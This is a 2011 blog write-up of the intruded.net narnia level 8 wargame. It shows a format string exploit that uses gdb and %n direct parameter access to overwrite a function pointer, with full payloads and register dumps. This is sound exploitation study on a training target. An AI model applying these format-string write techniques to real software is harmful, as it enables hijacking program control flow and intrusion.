title: intruded.net, narnia: level 8
Date: 2011/09/27 00:28
Author: Ken Ko
Tags: intruded.net, narnia, gdb, format string
Category: tutorials

Initial idea: exploit the string format in snprintf() to overwrite the function pointer and make it redirect to hackedfunction() instead of goodfunction(). 

Let's run an <strong>objdump -d level8 | less</strong> to see what we have to work with:

<code>
08048554 <vuln>:
...
 8048612:       ff d0                   call   *%eax

0804867a <goodfunction>:

080486a0 <hackedfunction>:
</code>

So, that doesn't really help me at all right now. Time to gdb?

Taking a look <a href="http://www.epanastasi.com/?page_id=60">here</a> for string format vulnerabilities. Of interest is the "Direct Parameter Access" section. There they say using <strong>%7$d</strong> "accesses the memory for the 7th argument". Then, let's try out their example:

<code>
$ cat print.c
#include <stdlib.h>
#include <stdio.h>

int main () {
    printf("Argument 7: %7$d, Argument 2: %2$d \n", 10, 20, 30, 40, 50, 60, 70, 80);
}
$ ./print
Argument 7: 70, Argument 2: 20
</code>

Damn. TIL.

So the pressing issue: how is this useful? Initial reaction says that this saves us from needing to constantly pop the stack. A different perspective (more information, basically) can be found <a href="http://www.exploit-db.com/papers/13239/">here</a> at exploit-db. Additionally, the <a href="http://www.defcon.org/images/defcon-18/dc-18-presentations/Haas/DEFCON-18-Haas-Adv-Format-String-Attacks.pdf">presentation on string format vulnerabilities given by Haas</a> in DEFCON 18 mentions the following, in passing:

<code>
%5$n = %p%p%p%p%p%n
</code>

Giving this another try:

<code>
AAAABBBB%7\$n == AAAABBBB%x%x%x%x%x%x%n
</code>

Looks like both of these give the same result. So, we save space. That's pretty cool; definitely a lot more convenient than adding and removing %x everywhere. We can't exactly call upon %s because the output doesn't get printed to stdout, so let's try to write it to a variable--preferably, <strong>$eax</strong>.

So now that we can read memory addresses, what's in the function pointer? We should get our address, first...

<code>
(gdb) r hi
Starting program: /wargame/level8 hi
goodfunction() = 0x804867a
hackedfunction() = 0x80486a0

before : ptrf() = 0x804867a (0xbffff98c)
</code>

Cools. Let's read this:

<code>
(gdb) r `python -c 'print "\x8c\xf9\xff\xbf"'`%6\$n
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Program received signal SIGSEGV, Segmentation fault.
0x00000004 in ?? ()
(gdb) i r
eax            0x4      4
ecx            0x0      0
edx            0x4      4
ebx            0xb7fdfff4       -1208090636
esp            0xbffff96c       0xbffff96c
ebp            0xbffffa18       0xbffffa18
esi            0x0      0
edi            0xb8000cc0       -1207956288
eip            0x4      0x4
eflags         0x10282  [ SF IF RF ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb)
</code>

What.

Makes sense, we wrote four bytes (the address) prior to the %n. Translate 0x80486a0 to decimal and we have 134514336d. Subtract four for the offset, and try it out:

<code>
(gdb) r `python -c 'print "\x7c\xf9\xff\xbf"'`%134514332x%6\$n
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /wargame/level8 `python -c 'print "\x7c\xf9\xff\xbf"'`%134514332x%6\$n
goodfunction() = 0x804867a
hackedfunction() = 0x80486a0

before : ptrf() = 0x804867a (0xbffff97c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048612 in vuln ()
(gdb) i r
eax            0x80486a0        134514336
ecx            0x0      0
edx            0x80486a0        134514336
ebx            0xb7fdfff4       -1208090636
esp            0xbffff960       0xbffff960
ebp            0xbffffa08       0xbffffa08
esi            0x0      0
edi            0xb8000cc0       -1207956288
eip            0x8048612        0x8048612 <vuln+190>
eflags         0x282    [ SF IF ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb)
</code>

Winner winner chicken dinner.

Moving on to behemoth!
